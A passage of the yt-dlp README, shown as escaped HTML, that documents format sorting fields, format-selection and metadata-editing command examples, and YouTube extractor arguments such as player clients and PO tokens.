 &lt;li&gt;&lt;code&gt;hdr&lt;/code&gt;: The dynamic range of the video (&lt;code&gt;DV&lt;/code&gt; &amp;gt; &lt;code&gt;HDR12&lt;/code&gt; &amp;gt; &lt;code&gt;HDR10+&lt;/code&gt; &amp;gt; &lt;code&gt;HDR10&lt;/code&gt; &amp;gt; &lt;code&gt;HLG&lt;/code&gt; &amp;gt; &lt;code&gt;SDR&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;channels&lt;/code&gt;: The number of audio channels&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;tbr&lt;/code&gt;: Total average bitrate in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;vbr&lt;/code&gt;: Average video bitrate in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;abr&lt;/code&gt;: Average audio bitrate in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;br&lt;/code&gt;: Average bitrate in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;, &lt;code&gt;tbr&lt;/code&gt;/&lt;code&gt;vbr&lt;/code&gt;/&lt;code&gt;abr&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;asr&lt;/code&gt;: Audio sample rate in Hz&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Deprecation warning&lt;/strong&gt;: Many of these fields have (currently undocumented) aliases, that may be removed in a future version. It is recommended to use only the documented field names.&lt;/p&gt; 
&lt;p&gt;All fields, unless specified otherwise, are sorted in descending order. To reverse this, prefix the field with a &lt;code&gt;+&lt;/code&gt;. E.g. &lt;code&gt;+res&lt;/code&gt; prefers format with the smallest resolution. Additionally, you can suffix a preferred value for the fields, separated by a &lt;code&gt;:&lt;/code&gt;. E.g. &lt;code&gt;res:720&lt;/code&gt; prefers larger videos, but no larger than 720p and the smallest video if there are no videos less than 720p. For &lt;code&gt;codec&lt;/code&gt; and &lt;code&gt;ext&lt;/code&gt;, you can provide two preferred values, the first for video and the second for audio. E.g. &lt;code&gt;+codec:avc:m4a&lt;/code&gt; (equivalent to &lt;code&gt;+vcodec:avc,+acodec:m4a&lt;/code&gt;) sets the video codec preference to &lt;code&gt;h264&lt;/code&gt; &amp;gt; &lt;code&gt;h265&lt;/code&gt; &amp;gt; &lt;code&gt;vp9&lt;/code&gt; &amp;gt; &lt;code&gt;vp9.2&lt;/code&gt; &amp;gt; &lt;code&gt;av01&lt;/code&gt; &amp;gt; &lt;code&gt;vp8&lt;/code&gt; &amp;gt; &lt;code&gt;h263&lt;/code&gt; &amp;gt; &lt;code&gt;theora&lt;/code&gt; and audio codec preference to &lt;code&gt;mp4a&lt;/code&gt; &amp;gt; &lt;code&gt;aac&lt;/code&gt; &amp;gt; &lt;code&gt;vorbis&lt;/code&gt; &amp;gt; &lt;code&gt;opus&lt;/code&gt; &amp;gt; &lt;code&gt;mp3&lt;/code&gt; &amp;gt; &lt;code&gt;ac3&lt;/code&gt; &amp;gt; &lt;code&gt;dts&lt;/code&gt;. You can also make the sorting prefer the nearest values to the provided by using &lt;code&gt;~&lt;/code&gt; as the delimiter. E.g. &lt;code&gt;filesize~1G&lt;/code&gt; prefers the format with filesize closest to 1 GiB.&lt;/p&gt; 
&lt;p&gt;The fields &lt;code&gt;hasvid&lt;/code&gt; and &lt;code&gt;ie_pref&lt;/code&gt; are always given highest priority in sorting, irrespective of the user-defined order. This behavior can be changed by using &lt;code&gt;--format-sort-force&lt;/code&gt;. Apart from these, the default order used is: &lt;code&gt;lang,quality,res,fps,hdr:12,vcodec,channels,acodec,size,br,asr,proto,ext,hasaud,source,id&lt;/code&gt;. The extractors may override this default order, but they cannot override the user-provided order.&lt;/p&gt; 
&lt;p&gt;Note that the default for hdr is &lt;code&gt;hdr:12&lt;/code&gt;; i.e. Dolby Vision is not preferred. This choice was made since DV formats are not yet fully compatible with most devices. This may be changed in the future.&lt;/p&gt; 
&lt;p&gt;If your format selector is &lt;code&gt;worst&lt;/code&gt;, the last item is selected after sorting. This means it will select the format that is worst in all respects. Most of the time, what you actually want is the video with the smallest filesize instead. So it is generally better to use &lt;code&gt;-f best -S +size,+br,+res,+fps&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;If you use the &lt;code&gt;-S&lt;/code&gt;/&lt;code&gt;--format-sort&lt;/code&gt; option multiple times, each subsequent sorting argument will be prepended to the previous one, and only the highest priority entry of any duplicated field will be preserved. E.g. &lt;code&gt;-S proto -S res&lt;/code&gt; is equivalent to &lt;code&gt;-S res,proto&lt;/code&gt;, and &lt;code&gt;-S res:720,fps -S vcodec,res:1080&lt;/code&gt; is equivalent to &lt;code&gt;-S vcodec,res:1080,fps&lt;/code&gt;. You can use &lt;code&gt;--format-sort-reset&lt;/code&gt; to disregard any previously passed &lt;code&gt;-S&lt;/code&gt;/&lt;code&gt;--format-sort&lt;/code&gt; arguments and reset to the default order.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Tip&lt;/strong&gt;: You can use the &lt;code&gt;-v -F&lt;/code&gt; to see how the formats have been sorted (worst to best).&lt;/p&gt; 
&lt;h2&gt;Format Selection examples&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Download and merge the best video-only format and the best audio-only format,
# or download the best combined format if video-only format is not available
$ yt-dlp -f "bv+ba/b"

# Download best format that contains video,
# and if it doesn't already have an audio stream, merge it with best audio-only format
$ yt-dlp -f "bv*+ba/b"

# Same as above
$ yt-dlp

# Download the best video-only format and the best audio-only format without merging them
# For this case, an output template should be used since
# by default, bestvideo and bestaudio will have the same file name.
$ yt-dlp -f "bv,ba" -o "%(title)s.f%(format_id)s.%(ext)s"

# Download and merge the best format that has a video stream,
# and all audio-only formats into one file
$ yt-dlp -f "bv*+mergeall[vcodec=none]" --audio-multistreams

# Download and merge the best format that has a video stream,
# and the best 2 audio-only formats into one file
$ yt-dlp -f "bv*+ba+ba.2" --audio-multistreams


# The following examples show the old method (without -S) of format selection
# and how to use -S to achieve a similar but (generally) better result

# Download the worst video available (old method)
$ yt-dlp -f "wv*+wa/w"

# Download the best video available but with the smallest resolution
$ yt-dlp -S "+res"

# Download the smallest video available
$ yt-dlp -S "+size,+br"



# Download the best mp4 video available, or the best video if no mp4 available
$ yt-dlp -f "bv*[ext=mp4]+ba[ext=m4a]/b[ext=mp4] / bv*+ba/b"

# Download the best video with the best extension
# (For video, mp4 &amp;gt; mov &amp;gt; webm &amp;gt; flv. For audio, m4a &amp;gt; aac &amp;gt; mp3 ...)
$ yt-dlp -S "ext"



# Download the best video available but no better than 480p,
# or the worst video if there is no video under 480p
$ yt-dlp -f "bv*[height&amp;lt;=480]+ba/b[height&amp;lt;=480] / wv*+ba/w"

# Download the best video available with the largest height but no better than 480p,
# or the best video with the smallest resolution if there is no video under 480p
$ yt-dlp -S "height:480"

# Download the best video available with the largest resolution but no better than 480p,
# or the best video with the smallest resolution if there is no video under 480p
# Resolution is determined by using the smallest dimension.
# So this works correctly for vertical videos as well
$ yt-dlp -S "res:480"



# Download the best video (that also has audio) but no bigger than 50 MB,
# or the worst video (that also has audio) if there is no video under 50 MB
$ yt-dlp -f "b[filesize&amp;lt;50M] / w"

# Download the largest video (that also has audio) but no bigger than 50 MB,
# or the smallest video (that also has audio) if there is no video under 50 MB
$ yt-dlp -f "b" -S "filesize:50M"

# Download the best video (that also has audio) that is closest in size to 50 MB
$ yt-dlp -f "b" -S "filesize~50M"



# Download best video available via direct link over HTTP/HTTPS protocol,
# or the best video available via any protocol if there is no such video
$ yt-dlp -f "(bv*+ba/b)[protocol^=http][protocol!*=dash] / (bv*+ba/b)"

# Download best video available via the best protocol
# (https/ftps &amp;gt; http/ftp &amp;gt; m3u8_native &amp;gt; m3u8 &amp;gt; http_dash_segments ...)
$ yt-dlp -S "proto"



# Download the best video with either h264 or h265 codec,
# or the best video if there is no such video
$ yt-dlp -f "(bv*[vcodec~='^((he|a)vc|h26[45])']+ba) / (bv*+ba/b)"

# Download the best video with best codec no better than h264,
# or the best video with worst codec if there is no such video
$ yt-dlp -S "codec:h264"

# Download the best video with worst codec no worse than h264,
# or the best video with best codec if there is no such video
$ yt-dlp -S "+codec:h264"



# More complex examples

# Download the best video no better than 720p preferring framerate greater than 30,
# or the worst video (still preferring framerate greater than 30) if there is no such video
$ yt-dlp -f "((bv*[fps&amp;gt;30]/bv*)[height&amp;lt;=720]/(wv*[fps&amp;gt;30]/wv*)) + ba / (b[fps&amp;gt;30]/b)[height&amp;lt;=720]/(w[fps&amp;gt;30]/w)"

# Download the video with the largest resolution no better than 720p,
# or the video with the smallest resolution available if there is no such video,
# preferring larger framerate for formats with the same resolution
$ yt-dlp -S "res:720,fps"



# Download the video with smallest resolution no worse than 480p,
# or the video with the largest resolution available if there is no such video,
# preferring better codec and then larger total bitrate for the same resolution
$ yt-dlp -S "+res:480,codec,br"
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;MODIFYING METADATA&lt;/h1&gt; 
&lt;p&gt;The metadata obtained by the extractors can be modified by using &lt;code&gt;--parse-metadata&lt;/code&gt; and &lt;code&gt;--replace-in-metadata&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;--replace-in-metadata FIELDS REGEX REPLACE&lt;/code&gt; is used to replace text in any metadata field using &lt;a href="https://docs.python.org/3/library/re.html#regular-expression-syntax"&gt;Python regular expression&lt;/a&gt;. &lt;a href="https://docs.python.org/3/library/re.html?highlight=backreferences#re.sub"&gt;Backreferences&lt;/a&gt; can be used in the replace string for advanced use.&lt;/p&gt; 
&lt;p&gt;The general syntax of &lt;code&gt;--parse-metadata FROM:TO&lt;/code&gt; is to give the name of a field or an &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;output template&lt;/a&gt; to extract data from, and the format to interpret it as, separated by a colon &lt;code&gt;:&lt;/code&gt;. Either a &lt;a href="https://docs.python.org/3/library/re.html#regular-expression-syntax"&gt;Python regular expression&lt;/a&gt; with named capture groups, a single field name, or a similar syntax to the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;output template&lt;/a&gt; (only &lt;code&gt;%(field)s&lt;/code&gt; formatting is supported) can be used for &lt;code&gt;TO&lt;/code&gt;. The option can be used multiple times to parse and modify various fields.&lt;/p&gt; 
&lt;p&gt;Note that these options preserve their relative order, allowing replacements to be made in parsed fields and vice versa. Also, any field thus created can be used in the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template"&gt;output template&lt;/a&gt; and will also affect the media file's metadata added when using &lt;code&gt;--embed-metadata&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;This option also has a few special uses:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;You can download an additional URL based on the metadata of the currently downloaded video. To do this, set the field &lt;code&gt;additional_urls&lt;/code&gt; to the URL that you want to download. E.g. &lt;code&gt;--parse-metadata "description:(?P&amp;lt;additional_urls&amp;gt;https?://www\.vimeo\.com/\d+)"&lt;/code&gt; will download the first vimeo video found in the description&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;You can use this to change the metadata that is embedded in the media file. To do this, set the value of the corresponding field with a &lt;code&gt;meta_&lt;/code&gt; prefix. For example, any value you set to &lt;code&gt;meta_description&lt;/code&gt; field will be added to the &lt;code&gt;description&lt;/code&gt; field in the file - you can use this to set a different "description" and "synopsis". To modify the metadata of individual streams, use the &lt;code&gt;meta&amp;lt;n&amp;gt;_&lt;/code&gt; prefix (e.g. &lt;code&gt;meta1_language&lt;/code&gt;). Any value set to the &lt;code&gt;meta_&lt;/code&gt; field will overwrite all default values.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Metadata modification happens before format selection, post-extraction and other post-processing operations. Some fields may be added or changed during these steps, overriding your changes.&lt;/p&gt; 
&lt;p&gt;For reference, these are the fields yt-dlp adds by default to the file metadata:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;Metadata fields&lt;/th&gt; 
   &lt;th align="left"&gt;From&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;title&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;track&lt;/code&gt; or &lt;code&gt;title&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;date&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;upload_date&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;description&lt;/code&gt;, &lt;code&gt;synopsis&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;description&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;purl&lt;/code&gt;, &lt;code&gt;comment&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;webpage_url&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;track&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;track_number&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;artist&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;artist&lt;/code&gt;, &lt;code&gt;artists&lt;/code&gt;, &lt;code&gt;creator&lt;/code&gt;, &lt;code&gt;creators&lt;/code&gt;, &lt;code&gt;uploader&lt;/code&gt; or &lt;code&gt;uploader_id&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;composer&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;composer&lt;/code&gt; or &lt;code&gt;composers&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;genre&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;genre&lt;/code&gt;, &lt;code&gt;genres&lt;/code&gt;, &lt;code&gt;categories&lt;/code&gt; or &lt;code&gt;tags&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;album&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;album&lt;/code&gt; or &lt;code&gt;series&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;album_artist&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;album_artist&lt;/code&gt; or &lt;code&gt;album_artists&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;disc&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;disc_number&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;show&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;series&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;season_number&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;season_number&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;episode_id&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;episode&lt;/code&gt; or &lt;code&gt;episode_id&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;episode_sort&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;episode_number&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;code&gt;language&lt;/code&gt; of each stream&lt;/td&gt; 
   &lt;td align="left"&gt;the format's &lt;code&gt;language&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: The file format may not support some of these fields&lt;/p&gt; 
&lt;h2&gt;Modifying metadata examples&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Interpret the title as "Artist - Title"
$ yt-dlp --parse-metadata "title:%(artist)s - %(title)s"

# Regex example
$ yt-dlp --parse-metadata "description:Artist - (?P&amp;lt;artist&amp;gt;.+)"

# Copy the episode field to the title field (with FROM and TO as single fields)
$ yt-dlp --parse-metadata "episode:title"

# Set title as "Series name S01E05"
$ yt-dlp --parse-metadata "%(series)s S%(season_number)02dE%(episode_number)02d:%(title)s"

# Prioritize uploader as the "artist" field in video metadata
$ yt-dlp --parse-metadata "%(uploader|)s:%(meta_artist)s" --embed-metadata

# Set "comment" field in video metadata using description instead of webpage_url,
# handling multiple lines correctly
$ yt-dlp --parse-metadata "description:(?s)(?P&amp;lt;meta_comment&amp;gt;.+)" --embed-metadata

# Do not set any "synopsis" in the video metadata
$ yt-dlp --parse-metadata ":(?P&amp;lt;meta_synopsis&amp;gt;)"

# Remove "formats" field from the infojson by setting it to an empty string
$ yt-dlp --parse-metadata "video::(?P&amp;lt;formats&amp;gt;)" --write-info-json

# Replace all spaces and "_" in title and uploader with a `-`
$ yt-dlp --replace-in-metadata "title,uploader" "[ _]" "-"

&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;EXTRACTOR ARGUMENTS&lt;/h1&gt; 
&lt;p&gt;Some extractors accept additional arguments which can be passed using &lt;code&gt;--extractor-args KEY:ARGS&lt;/code&gt;. &lt;code&gt;ARGS&lt;/code&gt; is a &lt;code&gt;;&lt;/code&gt; (semicolon) separated string of &lt;code&gt;ARG=VAL1,VAL2&lt;/code&gt;. E.g. &lt;code&gt;--extractor-args "youtube:player-client=tv,mweb;formats=incomplete" --extractor-args "twitter:api=syndication"&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;Note: In CLI, &lt;code&gt;ARG&lt;/code&gt; can use &lt;code&gt;-&lt;/code&gt; instead of &lt;code&gt;_&lt;/code&gt;; e.g. &lt;code&gt;youtube:player-client"&lt;/code&gt; becomes &lt;code&gt;youtube:player_client"&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;The following extractors use this feature:&lt;/p&gt; 
&lt;h4&gt;youtube&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;lang&lt;/code&gt;: Prefer translated metadata (&lt;code&gt;title&lt;/code&gt;, &lt;code&gt;description&lt;/code&gt; etc) of this language code (case-sensitive). By default, the video primary language metadata is preferred, with a fallback to &lt;code&gt;en&lt;/code&gt; translated. See &lt;a href="https://github.com/yt-dlp/yt-dlp/raw/415b4c9f955b1a0391204bd24a7132590e7b3bdb/yt_dlp/extractor/youtube/_base.py#L402-L409"&gt;youtube/_base.py&lt;/a&gt; for the list of supported content language codes&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;skip&lt;/code&gt;: One or more of &lt;code&gt;hls&lt;/code&gt;, &lt;code&gt;dash&lt;/code&gt; or &lt;code&gt;translated_subs&lt;/code&gt; to skip extraction of the m3u8 manifests, dash manifests and &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/4090#issuecomment-1158102032"&gt;auto-translated subtitles&lt;/a&gt; respectively&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;player_client&lt;/code&gt;: Clients to extract video data from. The currently available clients are &lt;code&gt;web&lt;/code&gt;, &lt;code&gt;web_safari&lt;/code&gt;, &lt;code&gt;web_embedded&lt;/code&gt;, &lt;code&gt;web_music&lt;/code&gt;, &lt;code&gt;web_creator&lt;/code&gt;, &lt;code&gt;mweb&lt;/code&gt;, &lt;code&gt;ios&lt;/code&gt;, &lt;code&gt;android&lt;/code&gt;, &lt;code&gt;android_vr&lt;/code&gt;, &lt;code&gt;tv&lt;/code&gt;, &lt;code&gt;tv_downgraded&lt;/code&gt;, and &lt;code&gt;tv_simply&lt;/code&gt;. By default, &lt;code&gt;android_vr,web,web_safari&lt;/code&gt; is used. If no JavaScript runtime/engine is available, then only &lt;code&gt;android_vr&lt;/code&gt; is used. If logged-in cookies are passed to yt-dlp, then &lt;code&gt;tv_downgraded,web,web_safari&lt;/code&gt; is used for free accounts and &lt;code&gt;tv_downgraded,web_creator,web&lt;/code&gt; is used for premium accounts. The &lt;code&gt;web_music&lt;/code&gt; client is added for &lt;code&gt;music.youtube.com&lt;/code&gt; URLs when logged-in cookies are used. The &lt;code&gt;web_embedded&lt;/code&gt; client is added for age-restricted videos but only successfully works around the age-restriction sometimes (e.g. if the video is embeddable), and may be added as a fallback if &lt;code&gt;android_vr&lt;/code&gt; is unable to access a video. The &lt;code&gt;web_creator&lt;/code&gt; client is added for age-restricted videos if account age-verification is required. Some clients, such as &lt;code&gt;web_creator&lt;/code&gt; and &lt;code&gt;web_music&lt;/code&gt;, require a &lt;code&gt;po_token&lt;/code&gt; for their formats to be downloadable. Some clients, such as &lt;code&gt;web_creator&lt;/code&gt;, will only work with authentication. Not all clients support authentication via cookies. You can use &lt;code&gt;default&lt;/code&gt; for the default clients, or you can use &lt;code&gt;all&lt;/code&gt; for all clients (not recommended). You can prefix a client with &lt;code&gt;-&lt;/code&gt; to exclude it, e.g. &lt;code&gt;youtube:player_client=default,-web&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;player_skip&lt;/code&gt;: Skip some network requests that are generally needed for robust extraction. One or more of &lt;code&gt;configs&lt;/code&gt; (skip client configs), &lt;code&gt;webpage&lt;/code&gt; (skip initial webpage), &lt;code&gt;js&lt;/code&gt; (skip js player), &lt;code&gt;initial_data&lt;/code&gt; (skip initial data/next ep request). While these options can help reduce the number of requests needed or avoid some rate-limiting, they could cause issues such as missing formats or metadata. See &lt;a href="https://github.com/yt-dlp/yt-dlp/pull/860"&gt;#860&lt;/a&gt; and &lt;a href="https://github.com/yt-dlp/yt-dlp/issues/12826"&gt;#12826&lt;/a&gt; for more details&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;webpage_skip&lt;/code&gt;: Skip extraction of embedded webpage data. One or both of &lt;code&gt;player_response&lt;/code&gt;, &lt;code&gt;initial_data&lt;/code&gt;. These options are for testing purposes and don't skip any network requests&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;player_params&lt;/code&gt;: YouTube player parameters to use for player requests. Will overwrite any default ones set by yt-dlp.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;player_js_variant&lt;/code&gt;: The player javascript variant to use for n/sig deciphering. The known variants are: &lt;code&gt;main&lt;/code&gt;, &lt;code&gt;tcc&lt;/code&gt;, &lt;code&gt;tce&lt;/code&gt;, &lt;code&gt;es5&lt;/code&gt;, &lt;code&gt;es6&lt;/code&gt;, &lt;code&gt;tv&lt;/code&gt;, &lt;code&gt;tv_es6&lt;/code&gt;, &lt;code&gt;phone&lt;/code&gt;. The default is &lt;code&gt;tv&lt;/code&gt;, and the others are for debugging purposes. You can use &lt;code&gt;actual&lt;/code&gt; to go with what is prescribed by the site&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;player_js_version&lt;/code&gt;: The player javascript version to use for n/sig deciphering, in the format of &lt;code&gt;signature_timestamp@hash&lt;/code&gt; (e.g. &lt;code&gt;20348@0004de42&lt;/code&gt;). The default is to use what is prescribed by the site, and can be selected with &lt;code&gt;actual&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;comment_sort&lt;/code&gt;: &lt;code&gt;top&lt;/code&gt; or &lt;code&gt;new&lt;/code&gt; (default) - choose comment sorting mode (on YouTube's side)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;max_comments&lt;/code&gt;: Limit the amount of comments to gather. Comma-separated list of integers representing &lt;code&gt;max-comments,max-parents,max-replies,max-replies-per-thread,max-depth&lt;/code&gt;. Default is &lt;code&gt;all,all,all,all,all&lt;/code&gt; 
  &lt;ul&gt; 
   &lt;li&gt;A &lt;code&gt;max-depth&lt;/code&gt; value of &lt;code&gt;1&lt;/code&gt; will discard all replies, regardless of the &lt;code&gt;max-replies&lt;/code&gt; or &lt;code&gt;max-replies-per-thread&lt;/code&gt; values given&lt;/li&gt; 
   &lt;li&gt;E.g. &lt;code&gt;all,all,1000,10,2&lt;/code&gt; will get a maximum of 1000 replies total, with up to 10 replies per thread, and only 2 levels of depth (i.e. top-level comments plus their immediate replies). &lt;code&gt;1000,all,100&lt;/code&gt; will get a maximum of 1000 comments, with a maximum of 100 replies total&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;formats&lt;/code&gt;: Change the types of formats to return. &lt;code&gt;dashy&lt;/code&gt; (convert HTTP to DASH), &lt;code&gt;duplicate&lt;/code&gt; (identical content but different URLs or protocol; includes &lt;code&gt;dashy&lt;/code&gt;), &lt;code&gt;incomplete&lt;/code&gt; (cannot be downloaded completely - live dash and post-live m3u8), &lt;code&gt;missing_pot&lt;/code&gt; (include formats that require a PO Token but are missing one)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;innertube_host&lt;/code&gt;: Innertube API host to use for all API requests; e.g. &lt;code&gt;studio.youtube.com&lt;/code&gt;, &lt;code&gt;youtubei.googleapis.com&lt;/code&gt;. Note that cookies exported from one subdomain will not work on others&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;innertube_key&lt;/code&gt;: Innertube API key to use for all API requests. By default, no API key is used&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;raise_incomplete_data&lt;/code&gt;: &lt;code&gt;Incomplete Data Received&lt;/code&gt; raises an error instead of reporting a warning&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;data_sync_id&lt;/code&gt;: Overrides the account Data Sync ID used in Innertube API requests. This may be needed if you are using an account with &lt;code&gt;youtube:player_skip=webpage,configs&lt;/code&gt; or &lt;code&gt;youtubetab:skip=webpage&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;visitor_data&lt;/code&gt;: Overrides the Visitor Data used in Innertube API requests. This should be used with &lt;code&gt;player_skip=webpage,configs&lt;/code&gt; and without cookies. Note: this may have adverse effects if used improperly. If a session from a browser is wanted, you should pass cookies instead (which contain the Visitor ID)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;po_token&lt;/code&gt;: Proof of Origin (PO) Token(s) to use. Comma-separated list of PO Tokens in the format &lt;code&gt;CLIENT.CONTEXT+PO_TOKEN&lt;/code&gt;, e.g. &lt;code&gt;youtube:po_token=web.gvs+XXX,web.player=XXX,web_safari.gvs+YYY&lt;/code&gt;. Context can be any of &lt;code&gt;gvs&lt;/code&gt; (Google Video Server URLs), &lt;code&gt;player&lt;/code&gt; (Innertube player request) or &lt;code&gt;subs&lt;/code&gt; (Subtitles)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;pot_trace&lt;/code&gt;: Enable debug logging for PO Token fetching. Either &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; (default)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;fetch_pot&lt;/code&gt;: Policy to use for fetching a PO Token from providers. One of &lt;code&gt;always&lt;/code&gt; (always try fetch a PO Token regardless if the client requires one for the given context), &lt;code&gt;never&lt;/code&gt; (never fetch a PO Token), or &lt;code&gt;auto&lt;/code&gt; (default; only fetch a PO Token if the client requires one for the given context)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;jsc_trace&lt;/code&gt;: Enable debug logging for JS Challenge fetching. Either &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; (default)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;use_ad_playback_context&lt;/code&gt;: Skip preroll ads to eliminate the mandatory wait period before download. Do NOT use this when passing premium account cookies to yt-dlp, as it will result in a loss of premium formats. Only effective with the &lt;code&gt;web&lt;/code&gt;, &lt;code&gt;web_safari&lt;/code&gt;, &lt;code&gt;web_music&lt;/code&gt; and &lt;code&gt;mweb&lt;/code&gt; player clients. Either &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt; (default)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;youtube-ejs&lt;/h4&gt; 
&lt;ul&gt; 
